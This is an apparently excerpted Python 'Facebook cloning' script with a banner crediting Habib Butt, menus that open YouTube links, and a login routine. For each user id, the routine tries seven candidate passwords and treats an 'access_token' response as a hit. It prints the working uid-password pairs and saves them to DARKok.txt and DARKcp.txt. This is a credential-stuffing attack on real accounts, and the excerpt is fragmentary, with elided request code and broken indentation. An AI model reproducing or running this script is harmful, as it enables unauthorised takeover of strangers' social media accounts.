...
\033[0;92m                                                               __  __ _    _ ______ ______ 
     /\   |  \/  | |  | |  ____|  ____|
    /  \  | \  / | |__| | |__  | |__   
   / /\ \ | |\/| |  __  |  __| |  __|  
  / ____ \| |  | | |  | | |____| |____ 
...
\033[1;92m AUTHOR iZ : Habib Butt

\033[1;92m Wtsapp  : +923016552479 

\033[1;91m-----------------------------------------------

\033[1;92m  I'M YOUR HERO: 

\033[1;92m DON'T PANGA WITH SANU AMHEE

\033[1;91m-----------------------------------------------

\033[1;91m-----------------------------------------------                           

                 WELLCOME TO Habib Butt
...
def main():
    ...
    print("\033[0;96m[ LETS START WITH Ha Habib Butt ]").center(50)
    ...
    print("\033[1;92m[2]\033[1;97mSUBCRIBE MY CHANNAL")
    ...
    print("\033[1;91m[0]\033[1;93mBACK WITH DARK DEVIL ")
...
def main_select():
    ...
    if Mz =="2":
        ...
        os.system("xdg-open https://youtu.be/tQWJDEIdtz4")
...
def login_select():
	...
	print("")
        ...
        os.system("xdg-open https://youtu.be/8-whvzxi3h8")
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        ...
		        print("\033[1;93m[DARK>CP] "+uid+" = "+pass1)

 

		        cp=open("DARKcp.txt","a")
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;97m[DARK = OK] "+uid+" = "+pass1+"\x1b[1;0m")

 

		            ok=open("DARKok.txt","a")
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                print("\033[1;93m[MZ>CP] "+uid+" = "+pass2)
		                ...
		                if 'access_token' in d:
		                    ...
		                    print("\x1b[1;97m[MZ = OK] "+uid+" = "+pass2+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        print("\033[1;93m[DARK>CP] "+uid+" = "+pass3)
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            print("\x1b[1;97m[DARK = OK] "+uid+" = "+pass3+"\x1b[1;0m")
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                print("\033[1;93m[MZ>CP] "+uid+" = "+pass4)
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;97m[MZ = OK] "+uid+" = "+pass4+"\x1b[1;0m")
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        print("\033[1;93m[MZ>CP] "+uid+" = "+pass5)
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            print("\x1b[1;97m[MZ = OK] "+uid+" = "+pass5+"\x1b[1;0m")
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                print("\033[1;93m[MZ>CP] "+uid+" = "+pass6)
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    print("\x1b[1;97m[MZ = OK] "+uid+" = "+pass6+"\x1b[1;0m")
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        print("\033[1;93m[MZ>CP] "+uid+" = "+pass7)
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            ...
		                                                            print("\x1b[1;97m[MZ = OK] "+uid+" = "+pass7+"\x1b[1;0m")
